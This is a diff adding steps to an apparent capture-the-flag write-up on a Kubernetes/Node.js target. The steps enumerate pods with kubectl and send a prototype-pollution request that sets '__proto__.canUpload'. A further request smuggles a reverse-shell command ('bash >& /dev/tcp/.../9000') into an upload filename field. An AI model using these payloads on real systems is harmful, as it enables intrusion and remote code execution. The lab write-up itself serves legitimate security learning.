@@ -346,11 +346,30 @@ A namespace contains Kubernetes resources like pods, services, and deployments.
 
 ![obraz](https://github.com/user-attachments/assets/a85a41e4-fab6-4f38-bf29-7f142f89b784)
 
+Now we want to take a look at pods contained in "dev" namespace:  
+```
+./kubectl get pods -n dev
+```
+![obraz](https://github.com/user-attachments/assets/14051b1a-2793-48a2-a686-bda0ab00393e)  
 
 
+Let's get more information about this pod:  
+```
+./kubectl describe pod devnode-deployment-776dbcf7d6 -n dev
+```
+![obraz](https://github.com/user-attachments/assets/c5860a2a-4fc9-422e-b129-313141f58829)
 
+It revealed service running on port 3000, it is node js port.  
+We can modify previous exploit to use pod's IP address:  
+```
+curl -X PUT http://10.42.0.69:3000/ -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "message": {"test": "something", "__proto__": {"canUpload": true}}}'
+```
 
-
+And then start listener on port 9000 and run this command:  
+```
+curl -X POST http://10.42.0.69:3000/upload -H 'Content-Type: application/json' -d '{"auth": {"name": "felamos", "password": "Winter2021"}, "filename": "x; bash -c \"bash >& /dev/tcp/10.10.14.7/9000 0>&1\""}'
+```
+![obraz](https://github.com/user-attachments/assets/7aca7a48-f465-41fe-8a06-4080f72326e7)
 
 
 
